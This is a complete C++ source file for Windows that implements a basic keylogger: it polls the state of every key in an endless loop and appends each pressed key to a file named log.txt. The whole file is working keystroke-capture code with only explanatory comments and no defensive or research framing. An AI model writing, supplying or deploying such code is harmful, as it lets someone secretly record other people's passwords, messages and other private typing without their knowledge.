#include <fstream>
#include <iostream>
#include <chrono>
#include <thread>
#include <Windows.h>

// Define a function to write the pressed key to a log file
void write_to_file(char key) {
    static std::ofstream logfile("log.txt", std::ios_base::app);

    if (logfile) {
        logfile << key;
    }
}

// Define a function to listen to the keyboard and call the write_to_file function when a key is pressed
void keyboard_listener() {
    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                char key = static_cast<char>(i);

                // If the key is a letter, convert it to lowercase
                if (key >= 'A' && key <= 'Z') {
                    key += 32;
                }

                write_to_file(key);
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

int main() {
    try {
        // Create a thread to listen to the keyboard
        std::thread listener_thread(keyboard_listener);

        // Wait for the thread to finish
        listener_thread.join();
    }
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}